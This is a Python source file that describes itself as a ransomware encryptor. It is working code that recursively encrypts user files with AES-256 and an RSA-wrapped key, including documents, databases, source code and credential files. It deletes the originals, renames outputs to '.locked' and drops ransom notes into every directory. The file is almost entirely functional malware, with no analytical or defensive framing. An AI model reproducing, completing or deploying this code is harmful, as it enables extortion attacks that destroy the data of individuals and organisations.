# -*- coding: utf-8 -*-
"""Ransomware encryptor -- AES-256-CBC per-file + RSA-2048 key wrapping.

Author: zxwn
"""
import os, hashlib
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

EXTENSIONS_WHITELIST = [
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd",
    ".mp4", ".avi", ".mkv", ".mov", ".mp3", ".wav", ".flac",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
    ".db", ".sql", ".sqlite", ".mdb", ".accdb",
    ".py", ".js", ".html", ".css", ".php", ".java", ".cpp", ".c", ".h",
    ".txt", ".csv", ".xml", ".json", ".yaml", ".yml",
    ".pem", ".key", ".ppk", ".rdp", ".ovpn",
]
EXTENSION_ENCRYPTED = ".locked"


def generate_rsa_keypair() -> tuple:
    """Generate RSA-2048 keypair. Returns (private_pem, public_pem)."""
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return private_pem, public_pem


def encrypt_file(filepath: str, public_key_pem: bytes) -> dict:
    """Encrypt single file with AES-256-CBC. Wrap AES key with RSA public key.

    File structure after encryption:
    [4 bytes: encrypted AES key length][RSA-encrypted AES key][16 bytes: IV][AES-encrypted data]
    """
    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())

    # Generate random AES key + IV
    aes_key = os.urandom(32)
    iv = os.urandom(16)

    # Read plaintext
    with open(filepath, "rb") as f:
        plaintext = f.read()

    # AES-256-CBC encrypt
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad_len] * pad_len)
    ciphertext = encryptor.update(padded) + encryptor.finalize()

    # RSA wrap AES key
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    # Write encrypted file
    output_path = filepath + EXTENSION_ENCRYPTED
    with open(output_path, "wb") as f:
        f.write(len(encrypted_key).to_bytes(4, "big"))
        f.write(encrypted_key)
        f.write(iv)
        f.write(ciphertext)

    # Delete original
    os.unlink(filepath)

    return {
        "original": filepath,
        "encrypted": output_path,
        "original_size": len(plaintext),
        "encrypted_size": len(ciphertext) + len(encrypted_key) + 20,
        "aes_key_hash": hashlib.sha256(aes_key).hexdigest()[:16],
    }


def encrypt_directory(path: str, public_key_pem: bytes, extensions: list = None) -> list:
    """Encrypt all matching files in directory recursively."""
    if extensions is None:
        extensions = EXTENSIONS_WHITELIST

    results = []
    for root, dirs, files in os.walk(path):
        for fname in files:
            ext = os.path.splitext(fname)[1].lower()
            if ext in extensions and not fname.endswith(EXTENSION_ENCRYPTED):
                full_path = os.path.join(root, fname)
                try:
                    r = encrypt_file(full_path, public_key_pem)
                    results.append(r)
                except Exception as e:
                    results.append({"error": str(e), "file": full_path})

    return results


def write_ransom_note(path: str, note: str):
    """Drop ransom note in directory."""
    for root, dirs, files in os.walk(path):
        note_path = os.path.join(root, "README_DECRYPT.txt")
        with open(note_path, "w") as f:
            f.write(note)


if __name__ == "__main__":
    print("[encryptor] Loaded.")
    priv, pub = generate_rsa_keypair()
    print("RSA keypair generated.")
    print("SAVE PRIVATE KEY: {}".format(priv[:50].decode() + "..."))
    # Test encrypt a temp file
    test_file = "/tmp/test.txt"
    with open(test_file, "w") as f:
        f.write("Sensitive data for encryption test.")
    result = encrypt_file(test_file, pub)
    print("Encrypted: " + str(result))
